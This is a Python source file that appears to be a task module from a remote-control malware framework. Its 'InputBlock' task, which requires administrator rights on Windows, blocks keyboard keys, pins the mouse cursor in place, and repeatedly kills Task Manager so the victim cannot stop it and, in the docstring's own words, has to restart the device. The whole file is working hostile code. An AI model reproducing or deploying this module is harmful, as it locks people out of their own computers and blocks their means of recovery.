from tasks.__task import Task
from utils import threaded_task


class InputBlock(Task):
    """Blocks user input. User have to restart device."""
    platforms = ["win32"]
    description = __doc__
    administrator = {"win32": True}
    kwargs = {"keyboard_block": {"type": bool, "description": "Block keyboard", "default": True},
              "mouse_block": {"type": bool, "description": "Block mouse", "default": True}}

    def __init__(self, task_id):
        super(InputBlock, self).__init__(task_id)
        import logging
        import threading

        self._logger = logging.getLogger(self.__class__.__name__)
        self._run = threading.Event()
        self._mouse_block_thread = None

    @threaded_task
    def start(self, keyboard_block=True, mouse_block=True):
        from time import sleep
        from keyboard import block_key
        from psutil import process_iter

        self._run.set()
        if keyboard_block:
            for i in range(150):
                block_key(i)

        if mouse_block:
            self._mouse_block_thread = self._block_mouse()
            self._mouse_block_thread.start()

        while self._run.is_set():
            for proc in process_iter():
                try:
                    if proc.name() == "Taskmgr.exe":
                        proc.kill()
                except Exception:  # noqa
                    pass
            sleep(1)

    @threaded_task
    def _block_mouse(self):
        from mouse import move

        while self._run.is_set():
            move(1, 0, absolute=True, duration=0)

    def stop(self):
        self._run.clear()
